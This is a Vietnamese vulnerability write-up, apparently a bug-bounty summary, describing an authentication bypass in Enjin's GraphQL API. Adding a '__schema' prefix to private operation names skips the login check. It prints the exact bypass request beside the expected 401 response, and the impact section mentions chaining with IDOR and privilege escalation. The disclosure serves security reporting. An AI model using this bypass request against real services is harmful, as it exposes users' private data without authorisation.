**Chủ đề:** Authentication Bypass – GraphQL `__schema` Prefix (Enjin)
**Loại lỗi:** Authentication Bypass / Logic Error
**Mức độ:** Medium (5.3)

---

## Tóm tắt ngắn gọn

Enjin GraphQL API cho phép **bỏ qua xác thực** bằng cách **thêm tiền tố `__schema`** vào các thao tác (operations) vốn là **private**.
Do lỗi logic trong middleware xác thực, một số truy vấn **không bị yêu cầu đăng nhập**, dẫn đến truy cập trái phép vào dữ liệu / chức năng đáng lẽ cần auth.

---

## Bản chất lỗi

* GraphQL có **introspection (`__schema`, `__type`)**
* Logic auth:

  * ❌ Skip / bypass khi operation name bắt đầu bằng `__schema`
* Kết quả:

  * Truy vấn private **được xử lý như public**
  * Một số query khác gây **500 error** do auth context rỗng

---

## 1️⃣ Request đúng → Response đúng (hành vi mong đợi)

### Request (Private query, không có auth)

```
POST /graphql
Content-Type: application/json

{
  "query": "query getUserProfile { user { id email } }"
}
```

### Response đúng

```
401 Unauthorized
{
  "error": "Authentication required"
}
```

👉 Truy vấn private **bắt buộc phải đăng nhập**

---

## 2️⃣ Request bug → Response bug (hành vi sai)

### Request (Bypass bằng `__schema` prefix)

```
POST /graphql
Content-Type: application/json

{
  "query": "query __schema_getUserProfile { user { id email } }"
}
```

### Response bug

```
200 OK
{
  "data": {
    "user": {
      "id": "123",
      "email": "victim@enjin.io"
    }
  }
}
```

👉 **Không cần auth vẫn lấy được dữ liệu private** ❌

---

## Trường hợp phụ

* Với các query có bước **kiểm tra auth sâu hơn**:

  * Server trả **500 Internal Server Error**
  * Lý do: logic auth fail khi `user context = null`

---

## Impact

* Bypass authentication GraphQL
* Truy cập trái phép dữ liệu / chức năng nội bộ
* Có thể:

  * Enumerate schema
  * Chain với IDOR / privilege escalation

---

